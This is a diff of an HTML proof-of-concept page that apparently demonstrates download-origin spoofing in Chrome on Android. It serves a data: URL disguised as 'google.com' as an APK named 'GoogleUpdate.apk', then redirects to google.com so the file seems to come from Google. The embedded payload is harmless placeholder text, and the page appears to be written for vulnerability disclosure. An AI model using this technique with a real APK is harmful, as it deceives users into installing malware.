@@ -1,45 +1,48 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <title>Chrome Android Origin Spoof PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
+    body {
+      font-family: sans-serif;
       text-align: center;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
+      margin-top: 60px;
+    }
+    button {
+      font-size: 18px;
+      padding: 14px 28px;
+      border-radius: 8px;
+      border: none;
+      background: #1a73e8;
+      color: white;
     }
   </style>
 </head>
 
 <body>
+  <h2>Download  PoC</h2>
+  <p>Tap the button below</p>
 
-<script>
-function a() {
-    // Step 1: open google.com (user sees google.com)
-    window.open("https://google.com", "x");
+  <button onclick="start()">Download</button>
 
-    // Step 2: trigger spoofed download in SAME window
-    setTimeout(function () {
-        window.open(
-          "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==",
-          "x"
-        );
-    }, 2000);
-}
-</script>
+  <script>
+    function start() {
+      // STEP 1: trigger spoofed download
+      const a = document.createElement("a");
+      a.href =
+        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+      a.download = "GoogleUpdate.apk";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
 
-<center>
-  <input
-    type="button"
-    class="button"
-    value="Download From Original Site"
-    onclick="a()">
-</center>
-
+      // STEP 2: redirect AFTER download is initiated
+      setTimeout(() => {
+        location.href = "https://www.google.com";
+      }, 3000);
+    }
+  </script>
 </body>
 </html>
